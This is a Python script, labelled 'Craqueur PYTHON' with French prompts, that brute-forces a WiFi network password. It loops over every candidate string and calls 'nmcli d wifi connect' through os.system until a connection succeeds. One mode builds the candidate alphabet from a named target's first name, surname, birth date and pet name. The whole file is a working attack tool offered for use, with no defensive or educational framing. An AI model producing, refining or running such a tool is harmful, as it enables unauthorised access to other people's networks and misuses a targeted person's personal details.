import os
file = open("info.txt","r")
c = file.read().split('\n')
nomwifi = c[0]
file.close()
file = open("interface.txt","r")
c = file.read().split('\n')
interface = c[0]
file.close()
print("Craqueur PYTHON")

lettre = []
find = input('Quelle programme veux-tu : CH / Pour choisir tout les caractères que tu veux; DE / Pour utiliser le script default; SE / Pour le script Social Engenering Crack Wifi : ')
if find.lower() == 'ch' :
	i = True
	print('Ecrit les caractères 1 par 1. Ecrit start pour lancer le code') 
	while i :
		a = input('CARACTERE : ')
		if a.lower() == 'start' :
			i = False
		else :
			lettre.append(a)
elif find.lower() == 'de' :
	r = input('Veux tu des MAJUSCULES (o/n) : ')
	lt = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
	if r.lower() == 'o' :
		for i in lt :
			lettre.append(i.upper())
	r = input('Veux tu des minuscules (o/n) : ')
	if r.lower() == 'o' :
		for i in lt :
			lettre.append(i)
	r = input('Veux tu des chiffres (o/n) : ')
	if r.lower() == 'o' :
		ch = ["0","1","2","3","4","5","6","7","8","9"]
		for i in ch :
			lettre.append(i)
	r = input('Veux tu les symboles les plus utilisés (o/n) : ')
	if r.lower() == 'o' :
		sy = ["%","#","é","è","à","@","&","+","=","-","_"]
		for i in sy :
			lettre.append(i)
else :
	prenom = input("Prénom de la cible (minuscule) : ")
	nom = input("Nom de la cible (minuscule) : ")
	JN = input("Jour de naissance  (chiffre): ")
	MN = input("Mois de naissance (chiffre et/ou minuscule) : ")
	AN = input("Année de naissance (chiffre) : ")
	autre = input("Autre (nom de son animal préféré,...) (minuscule) : ")
	l1 = prenom + nom
	l2 = JN + MN
	l3 = AN + autre
	l4 = l1 + l2
	final = l3 + l4
	l5 = list(set(final))
	l6 = []
	for i in l5 :
		try :
			l = i.upper()
			l6.append(l)
		except :
			print('l')
	l7 = l6 + l5
	lettre = list(set(l7))
"""
l = input("Quelle lettres veux tu enlever (lettre1_lettre2 ...) : "
en = []
en = str(l).split('_')
for i in enlever :
	if i in lettre :
		liste = lettre.replace(i,'')
		lettre = liste
"""
print(lettre)
nombre = [-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]
i = True
print('nmcli d wifi connect "' + str(nomwifi) + '" password '  + " ifname " + interface)
while i :
	nb = nombre[0]
	nombre[0] = nb + 1
	for i in nombre :
		if len(lettre)  in nombre :
			tour = 0
			for n in nombre :
				if int(n) == int(len(lettre)) :
					changement = tour
				tour = tour + 1
			nombre[changement] = 0
			target = changement + 1
			nb = nombre[target] 
			nombre[target] = int(nb) + 1
	
	position = 0
	total = len(nombre) - 1
	final = []
	while position < total :
		if int(nombre[position]) != -1 :
			po = int(nombre[position])
			lf = lettre[po]
			final.append(str(lf))
		position = position + 1
	mot = ''.join(final)
	try :
		j = os.system('nmcli d wifi connect "' + nomwifi + '" password ' + mot + " ifname " + interface )
		print(j)
		if j != 256 :
			i = False
		else :	
			print(mot, end="\r")
	except :
		print('')
print('le mot de passe est : ' + mot )
